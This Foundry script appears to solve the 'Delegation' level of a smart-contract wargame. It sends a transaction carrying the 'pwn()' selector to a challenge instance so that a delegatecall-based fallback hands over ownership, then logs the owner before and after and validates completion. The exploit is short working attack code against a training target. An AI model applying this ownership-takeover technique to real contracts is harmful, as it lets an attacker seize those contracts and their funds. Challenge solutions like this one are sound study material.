// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Delegation} from "../src/6-Delegation.sol";
import {DelegationFactory} from "../src/DelegationFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract DelegationSolution is Script {
    Delegation public delegationLevel;
    address payable instanceAddress =
        payable(0x5069cedDF6d479bdD8E3763202EDCD0CDa8470C8);
    address public publicKey = vm.envAddress("PUBLIC_KEY");

    function run() external {
        delegationLevel = Delegation(instanceAddress);

        console.log("Owner before the attack: %s", delegationLevel.owner());

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        payable(instanceAddress).call{value: 0}(
            abi.encodeWithSignature("pwn()")
        );
        vm.stopBroadcast();

        console.log("Owner after the attack: %s", delegationLevel.owner());

        validate();
    }

    function validate() internal {
        bool isValidated = new DelegationFactory().validateInstance(
            instanceAddress,
            publicKey
        );
        console.log("Challenge Completed: %s", isValidated);
    }
}

contract Attack {}
